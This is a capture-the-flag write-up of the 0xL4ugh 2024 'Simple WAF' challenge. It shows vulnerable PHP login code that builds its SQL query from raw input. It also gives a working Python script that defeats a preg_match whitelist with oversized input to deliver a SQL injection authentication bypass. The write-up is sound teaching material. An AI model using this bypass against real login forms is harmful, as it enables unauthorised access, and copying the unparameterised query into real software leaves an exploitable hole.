# Simple WAF

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @.h0ps
- Contributor: @Colonneil
- 42 solves / 198 points
- Difficulty: Medium
- Author: abdoghazy
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

i whitelisted input values so, i think iam safe : P

[Link](http://20.115.83.90:1339/)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211160535.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211160703.png)

In here, we can login as an account.

Although this page has 2 links: "Forget password?" and "Sign up", they both return HTTP status "404 Not Found":

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211160848.png)

In the login page, we can try to enter some dummy credentials:

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211161017.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211161026.png)

When we entered an incorrect credential, it'll pop up an alert box with text "Wrong Creds".

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211161119.png)

When we clicked the "Login" button, it'll send a POST request to `/` with parameter `username`, `password`, and `login-submit`.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/Web/Simple-WAF/simple_waf_togive.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/0xL4ugh-CTF-2024/Web/Simple-WAF)-[2024.02.11|16:06:45(HKT)]
└> file simple_waf_togive.zip 
simple_waf_togive.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/0xL4ugh-CTF-2024/Web/Simple-WAF)-[2024.02.11|16:06:48(HKT)]
└> unzip simple_waf_togive.zip 
Archive:  simple_waf_togive.zip
  inflating: init.sh                 
   creating: src/
  inflating: src/db.php              
  inflating: src/index.php           
  inflating: Dockerfile              
  inflating: init.db                 
```

Let's read through this application's source code!

Luckily, this application is really simple.

**Logic of endpoint `/` POST request:**
```php
[...]
if(isset($_POST['login-submit']))
{
    if(!empty($_POST['username'])&&!empty($_POST['password']))
    {
        $username=$_POST['username'];
        $password=md5($_POST['password']);
        if(waf($username))
        {
            die("WAF Block");
        }
        else
        {
            $res = $conn->query("select * from users where username='$username' and password='$password'");
                                                                    
            if($res->num_rows ===1)
            {
                echo "0xL4ugh{Fake_Flag}";
            }
            else
            {
                echo "<script>alert('Wrong Creds')</script>";
            }
    }

    }
    else
    {
        echo "<script>alert('Please Fill All Fields')</script>";
    }
}
[...]
```

When we send a POST request with parameter `username`, `password`, and `login-submit`, it'll **check our `username` value against a "WAF"** (Web Application Firewall). After that, it'll execute a SQL statement to select a user from table `users` with our provided `username` and `password`.

However, **the SQL statement didn't use prepared statement**. Hence, **it's vulnerable to SQL injection**.

That being said, **we should be able to bypass the authentication with a simple SQL injection payload**.

**But before we do that, let's check out the `waf()` function:**
```php
[...]
function waf($input)
{
    if(preg_match("/([^a-z])+/s",$input))
    {
        return true;
    }
    else
    {
        return false;
    }
}
[...]
```

In here, our `username` is **being checked against a regular expression pattern** with PHP built-in function **`preg_match()`**.

In the regular expression pattern, it only allows the input is starts with 1 or more lowercase character `a` through `z`, and excluding newline characters (`s` modifier).

Hmm... **How can we bypass the WAF to inject our SQL injection payload**??

Based on my experience, **PHP is a weird language, sometimes it can do really weird stuff**, like let's say the built-in function `preg_match()`.

According to [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#length-error-bypass), when a **very large valid input** is being parsed to `preg_match()`, **it'll just choked to death and can't process it**. Hence, we can bypass the regular expression check by just sending a large valid input!

## Exploitation

**Armed with above information, we can write a simple Python script to send a large valid input, and append our SQL injection payload!**
```python
#!/usr/bin/env python3
import requests

def main():
    url = 'http://20.115.83.90:1339/'
    payload = 'A' * 1000001
    payload += '\' OR 1=1-- -'
    data = {
        'username': payload,
        'password': 'foobar',
        'login-submit': ''
    }

    response = requests.post(url, data=data)
    responseText = response.text
    if '0xL4ugh{' not in responseText:
        print('[-] The exploit failed...')
        exit(0)

    flag = responseText.split('\n')[0].strip()
    print(f'[+] The exploit worked! Here\'s the flag:\n{flag}')

if __name__ == '__main__':
    main()
```

```shell
┌[siunam♥Mercury]-(~/ctf/0xL4ugh-CTF-2024/Web/Simple-WAF)-[2024.02.11|16:49:12(HKT)]
└> python3 exploit.py
[+] The exploit worked! Here's the flag:
0xL4ugh{0ohh_You_Brok3_My_Wh1te_List!!!}
```

- **Flag: `0xL4ugh{0ohh_You_Brok3_My_Wh1te_List!!!}`**

## Conclusion

What we've learned:

1. PHP built-in function `preg_match()` bypass